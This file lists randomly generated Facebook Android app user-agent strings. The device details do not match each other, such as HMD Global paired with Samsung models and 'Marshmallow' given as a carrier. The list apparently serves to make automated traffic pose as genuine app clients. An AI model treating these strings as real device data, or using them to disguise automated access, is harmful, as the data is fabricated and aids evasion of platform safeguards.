"[FBAN/FB4A;FBAV/199.0.0.80.103;FBBV/48658415;FBDM/{density=2.8,width=1025,height=2569};FBLC/en_PK;FBRV/48599249;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A136U1;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/172.0.0.80.158;FBBV/41791293;FBDM/{density=8.7,width=728,height=1961};FBLC/en_PK;FBRV/63524729;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M107F;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/107.0.0.90.46;FBBV/82091895;FBDM/{density=7.5,width=1424,height=2769};FBLC/en_PK;FBRV/76880962;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung T116NY;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/348.0.0.93.96;FBBV/94603451;FBDM/{density=9.9,width=650,height=2047};FBLC/en_GB;FBRV/49411377;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C105K;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/421.0.0.38.132;FBBV/68746257;FBDM/{density=3.4,width=825,height=1386};FBLC/en_PK;FBRV/97127656;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986W;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/338.0.0.26.55;FBBV/31228331;FBDM/{density=6.1,width=1447,height=1154};FBLC/en_US;FBRV/60447353;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737V;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/176.0.0.45.199;FBBV/31280259;FBDM/{density=4.6,width=683,height=1746};FBLC/en_GB;FBRV/51954324;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M205F;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/392.0.0.62.22;FBBV/59126957;FBDM/{density=5.8,width=972,height=2757};FBLC/en_GB;FBRV/11494634;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S906B;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/200.0.0.59.97;FBBV/31900501;FBDM/{density=1.7,width=1122,height=1058};FBLC/en_GB;FBRV/21308021;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A205F;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/25.0.0.6.61;FBBV/40788329;FBDM/{density=2.5,width=1188,height=1565};FBLC/en_US;FBRV/49086044;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727V;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/189.0.0.70.196;FBBV/86720833;FBDM/{density=8.8,width=768,height=2719};FBLC/en_US;FBRV/12225457;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9287;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/75.0.0.65.118;FBBV/39028942;FBDM/{density=1.8,width=1194,height=2270};FBLC/en_US;FBRV/28923081;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G6200;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/250.0.0.75.72;FBBV/29174688;FBDM/{density=4.6,width=997,height=2552};FBLC/en_PK;FBRV/37374251;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A035G;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/349.0.0.4.52;FBBV/43284294;FBDM/{density=6.6,width=801,height=1830};FBLC/en_PK;FBRV/76608150;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605F;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/85.0.0.74.64;FBBV/79647971;FBDM/{density=5.4,width=1278,height=1770};FBLC/en_PK;FBRV/79807938;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C7000;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/211.0.0.78.156;FBBV/29867393;FBDM/{density=5.7,width=1055,height=1591};FBLC/en_PK;FBRV/65902811;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A022M;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/354.0.0.2.30;FBBV/98881380;FBDM/{density=5.9,width=1320,height=2722};FBLC/en_PK;FBRV/22792027;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A022G;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/160.0.0.73.61;FBBV/83743710;FBDM/{density=9.4,width=925,height=2639};FBLC/en_US;FBRV/31062124;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5500;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/251.0.0.49.182;FBBV/48239070;FBDM/{density=8.7,width=1415,height=2518};FBLC/en_US;FBRV/17742971;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M015F;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/200.0.0.89.69;FBBV/94603186;FBDM/{density=4.3,width=1290,height=1818};FBLC/en_PK;FBRV/91631635;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7509;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/96.0.0.71.45;FBBV/29302176;FBDM/{density=3.2,width=1198,height=2094};FBLC/en_GB;FBRV/69326724;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3586V;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/373.0.0.18.12;FBBV/39489623;FBDM/{density=6.5,width=1212,height=2359};FBLC/en_US;FBRV/30317735;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J701F;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/150.0.0.61.124;FBBV/26577786;FBDM/{density=9.6,width=1458,height=2159};FBLC/en_US;FBRV/43625521;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G360F;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/433.0.0.92.68;FBBV/39840977;FBDM/{density=8.9,width=693,height=1827};FBLC/en_PK;FBRV/46057384;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M017F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/240.0.0.67.109;FBBV/26693848;FBDM/{density=5.8,width=695,height=2417};FBLC/en_PK;FBRV/41393473;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A305GT;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/194.0.0.75.182;FBBV/60324875;FBDM/{density=2.1,width=1200,height=2643};FBLC/en_GB;FBRV/47368785;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung W2022;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/133.0.0.26.30;FBBV/78264266;FBDM/{density=1.6,width=1230,height=1361};FBLC/en_GB;FBRV/15617546;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G532MT;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/93.0.0.2.189;FBBV/26561389;FBDM/{density=5.1,width=1392,height=1284};FBLC/en_PK;FBRV/32324041;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G955U;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/327.0.0.49.7;FBBV/13511216;FBDM/{density=2.7,width=1426,height=2159};FBLC/en_PK;FBRV/45700446;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025F;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/354.0.0.65.17;FBBV/46637384;FBDM/{density=4.9,width=1293,height=1124};FBLC/en_PK;FBRV/26890574;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9650;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/191.0.0.43.200;FBBV/34933744;FBDM/{density=8.1,width=1055,height=1958};FBLC/en_PK;FBRV/70975952;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C115M;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/206.0.0.69.155;FBBV/95524090;FBDM/{density=8.1,width=1175,height=2590};FBLC/en_GB;FBRV/38042364;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung 9005;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/121.0.0.8.57;FBBV/29669499;FBDM/{density=4.5,width=579,height=1554};FBLC/en_GB;FBRV/66534349;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A810S;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/335.0.0.29.166;FBBV/34078669;FBDM/{density=7.4,width=783,height=1089};FBLC/en_GB;FBRV/46800607;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N920G;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/350.0.0.53.8;FBBV/86076451;FBDM/{density=8.3,width=558,height=1795};FBLC/en_US;FBRV/42048411;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J320FN;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/23.0.0.44.117;FBBV/76105991;FBDM/{density=8.1,width=877,height=2044};FBLC/en_US;FBRV/88122531;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G973U1;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/313.0.0.33.83;FBBV/14349477;FBDM/{density=5.9,width=805,height=2144};FBLC/en_US;FBRV/96273800;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G935W8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/141.0.0.65.50;FBBV/82095243;FBDM/{density=3.3,width=728,height=1846};FBLC/en_PK;FBRV/40294780;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9108V;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/269.0.0.7.196;FBBV/16113927;FBDM/{density=3.8,width=1217,height=1637};FBLC/en_PK;FBRV/35885721;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G8870;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/143.0.0.68.14;FBBV/39382015;FBDM/{density=5.8,width=1327,height=1372};FBLC/en_GB;FBRV/39980285;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A336E;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/250.0.0.95.103;FBBV/30219425;FBDM/{density=3.1,width=1310,height=2187};FBLC/en_PK;FBRV/33061551;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A810F;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/295.0.0.26.4;FBBV/93587140;FBDM/{density=4.3,width=1141,height=2906};FBLC/en_GB;FBRV/54740532;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C701F;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/285.0.0.71.62;FBBV/73577251;FBDM/{density=9.3,width=1475,height=2094};FBLC/en_PK;FBRV/68959779;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A920F;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/351.0.0.97.18;FBBV/77175130;FBDM/{density=6.9,width=1194,height=2829};FBLC/en_US;FBRV/24324074;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930W8;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/16.0.0.10.183;FBBV/18556754;FBDM/{density=9.1,width=590,height=2643};FBLC/en_US;FBRV/90420848;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A136U;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/332.0.0.10.4;FBBV/34100445;FBDM/{density=3.7,width=616,height=1516};FBLC/en_US;FBRV/11992504;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C105L;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/82.0.0.45.136;FBBV/66011857;FBDM/{density=3.3,width=818,height=2408};FBLC/en_PK;FBRV/25535471;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G350E;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/401.0.0.80.105;FBBV/70428020;FBDM/{density=2.2,width=1265,height=2132};FBLC/en_GB;FBRV/94257876;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung W2021;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/179.0.0.61.57;FBBV/54474874;FBDM/{density=5.3,width=1400,height=1271};FBLC/en_GB;FBRV/20571506;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A305F;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/176.0.0.82.199;FBBV/76786684;FBDM/{density=8.9,width=704,height=2147};FBLC/en_PK;FBRV/49831859;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A107M;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/232.0.0.18.98;FBBV/43364359;FBDM/{density=8.1,width=1494,height=1361};FBLC/en_GB;FBRV/73186972;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G389F;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/348.0.0.41.192;FBBV/49762592;FBDM/{density=9.7,width=1321,height=1417};FBLC/en_US;FBRV/69872881;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727T1;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/361.0.0.50.155;FBBV/56953663;FBDM/{density=8.6,width=1408,height=2318};FBLC/en_GB;FBRV/47982239;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J530G;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/110.0.0.60.53;FBBV/33344331;FBDM/{density=6.2,width=1025,height=1705};FBLC/en_US;FBRV/84077547;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A710M;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/190.0.0.65.113;FBBV/17750562;FBDM/{density=6.8,width=1464,height=2898};FBLC/en_US;FBRV/53308489;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106H;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/392.0.0.18.176;FBBV/72442881;FBDM/{density=4.4,width=866,height=1279};FBLC/en_GB;FBRV/37105168;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J500FN;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/14.0.0.72.79;FBBV/24080140;FBDM/{density=2.3,width=928,height=1770};FBLC/en_US;FBRV/64652688;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S908B;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/124.0.0.43.60;FBBV/59992734;FBDM/{density=7.8,width=881,height=2189};FBLC/en_GB;FBRV/83625053;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A600G;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/241.0.0.83.151;FBBV/69922912;FBDM/{density=6.3,width=1431,height=1415};FBLC/en_PK;FBRV/12989613;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500FU;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/166.0.0.72.196;FBBV/94441968;FBDM/{density=1.8,width=1316,height=1380};FBLC/en_US;FBRV/20174237;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737R4;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/246.0.0.88.103;FBBV/79377689;FBDM/{density=9.1,width=1351,height=2184};FBLC/en_GB;FBRV/63997096;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A6050;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/256.0.0.3.77;FBBV/92364885;FBDM/{density=5.7,width=1084,height=2333};FBLC/en_US;FBRV/43848008;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313MY;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/412.0.0.74.25;FBBV/82324320;FBDM/{density=6.5,width=676,height=1457};FBLC/en_PK;FBRV/15191655;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G900FD;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/286.0.0.54.98;FBBV/55236815;FBDM/{density=6.7,width=675,height=2580};FBLC/en_GB;FBRV/43781759;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727P;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/378.0.0.26.148;FBBV/49432126;FBDM/{density=5.6,width=740,height=2639};FBLC/en_PK;FBRV/74502150;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7106;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/181.0.0.30.40;FBBV/51264260;FBDM/{density=7.4,width=623,height=1769};FBLC/en_PK;FBRV/31008067;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G720N0;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/47.0.0.55.92;FBBV/98195081;FBDM/{density=9.8,width=1256,height=1823};FBLC/en_GB;FBRV/35060029;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A510F;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/163.0.0.29.155;FBBV/37126698;FBDM/{density=3.3,width=642,height=2294};FBLC/en_GB;FBRV/18830894;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A336E;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/273.0.0.57.142;FBBV/99047867;FBDM/{density=2.4,width=1282,height=2715};FBLC/en_PK;FBRV/97727870;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G310HN;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/227.0.0.20.59;FBBV/49709224;FBDM/{density=6.6,width=987,height=2905};FBLC/en_PK;FBRV/36961376;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A725F;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/339.0.0.80.117;FBBV/65501200;FBDM/{density=8.2,width=1332,height=2356};FBLC/en_PK;FBRV/36137860;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G316ML;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/66.0.0.72.37;FBBV/30115454;FBDM/{density=2.1,width=1271,height=1157};FBLC/en_GB;FBRV/83093648;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N750L;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/84.0.0.50.145;FBBV/33846863;FBDM/{density=6.7,width=725,height=2059};FBLC/en_GB;FBRV/29543096;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7102;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/425.0.0.99.173;FBBV/38604467;FBDM/{density=5.7,width=1211,height=2138};FBLC/en_GB;FBRV/49937313;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A6050;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/419.0.0.15.189;FBBV/46133513;FBDM/{density=8.3,width=1117,height=1029};FBLC/en_PK;FBRV/11987936;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung 9005;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/352.0.0.2.146;FBBV/37631184;FBDM/{density=7.6,width=1198,height=1997};FBLC/en_PK;FBRV/87971970;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415FN;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/176.0.0.25.36;FBBV/36074816;FBDM/{density=1.9,width=837,height=1655};FBLC/en_PK;FBRV/37544655;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G570F;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/178.0.0.94.93;FBBV/54018741;FBDM/{density=1.4,width=786,height=2749};FBLC/en_GB;FBRV/52280264;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A725M;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/52.0.0.76.89;FBBV/51775874;FBDM/{density=5.1,width=1157,height=2406};FBLC/en_GB;FBRV/84847904;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A207M;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/281.0.0.23.144;FBBV/38737423;FBDM/{density=7.3,width=1389,height=2888};FBLC/en_US;FBRV/65444093;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M225FV;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/50.0.0.32.121;FBBV/74243311;FBDM/{density=9.3,width=1149,height=2917};FBLC/en_US;FBRV/69757424;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J250F;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.78.92;FBBV/27550336;FBDM/{density=8.1,width=1480,height=1863};FBLC/en_PK;FBRV/76608452;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A136W;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/196.0.0.11.83;FBBV/54986942;FBDM/{density=6.2,width=983,height=1279};FBLC/en_US;FBRV/58712480;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5528;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/30.0.0.74.9;FBBV/19352970;FBDM/{density=5.7,width=708,height=2298};FBLC/en_US;FBRV/51071509;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G360F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/189.0.0.60.181;FBBV/82028189;FBDM/{density=9.1,width=1478,height=2782};FBLC/en_GB;FBRV/47946873;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G386T1;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/357.0.0.63.91;FBBV/82977568;FBDM/{density=5.2,width=1252,height=2420};FBLC/en_GB;FBRV/26875369;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/288.0.0.72.167;FBBV/14653912;FBDM/{density=1.3,width=1373,height=1126};FBLC/en_US;FBRV/37379992;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G316HU;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/11.0.0.59.73;FBBV/52238503;FBDM/{density=3.5,width=1053,height=1369};FBLC/en_GB;FBRV/86275375;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A305N;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/16.0.0.13.94;FBBV/53042956;FBDM/{density=4.8,width=538,height=1264};FBLC/en_PK;FBRV/63016116;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920S;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/138.0.0.64.54;FBBV/71388017;FBDM/{density=2.5,width=1181,height=1447};FBLC/en_GB;FBRV/29389286;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G730W8;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
